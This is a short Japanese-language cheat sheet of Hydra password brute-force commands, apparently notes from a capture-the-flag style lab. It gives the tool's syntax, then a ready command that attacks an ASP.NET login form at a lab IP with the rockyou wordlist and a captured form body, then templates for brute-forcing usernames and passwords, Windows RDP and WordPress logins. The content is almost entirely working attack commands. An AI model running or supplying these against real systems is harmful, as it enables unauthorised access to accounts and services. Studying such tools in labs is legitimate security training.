[BurpSuite]で必要な部分を調べる
[パスワードリスト]
$ hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.153.65 http-post-form "/Account/login.aspx:__VIEWSTATE=lr0vTu%2Fpht2ZsUpniYyTUmtQ8jQlE446ChydKb%2F%2BSyZKvs4XzZ7qesO1MlyV3nCxd%2FTxAsJXDyxDISlWKsxNYb1aFC9313YMyThl2javbyoQCBsrc1LgH8Pcsk%2FyHmEp1D70WGq6hIq%2B%2BgEZLyVgIR7a%2FA6V4P4y6bLd72polrtARVmrmmIaGyYhTimH8Zs6qLBJRqvbSnD%2BbF04Gh71Z4cPUAVnTQEZJSqGeH9u%2BZ1KdhNz2jHkaJ5rwoCnaVcelFZmSY3Hy6teghWp3B1NMdq9Yt1VeihsM2UvULtN1zOsUWZ4OXV5VCy94fkqNqvS%2B0lrPZMI%2BNbkXnxYFt0jb8u4jyVMY%2B9voJPl3UJAJztokxdH&__EVENTVALIDATION=ve%2FO8U8DVvxv6i%2FUq0irsHWrl7uA780ORgVUxTkPA%2F1SEXlOyAsVjZ79a%2By%2BzKlqh9s5jGFhkB8o5FfX%2B7jxhKpt6EhHTigoPnZoICRDWS6C%2Bi8c%2FtjU0PkEPSgsEuRYMEUYeE2i4WxJ8eHAT9JCRs6ftxUpjtAF34PgtdZsYDcvvVMT&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3:F=Login failed"

	選択したプロトコルに対するブルートフォース
$ hydra -P <wordlist> -v <ip> <protocol>
 Hydraは、パスワードだけでなく、ユーザー名のブルートフォースにも使用できます。リストにあるすべての組み合わせをループします。(-vV = verbose mode, ログイン試行を表示)
$ hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
	パスワードリストを使って、Windowsリモートデスクトップを攻撃する。
$ hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
	ハイドラがブルートフォースするために、より具体的なリクエストを作成する。
$ hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'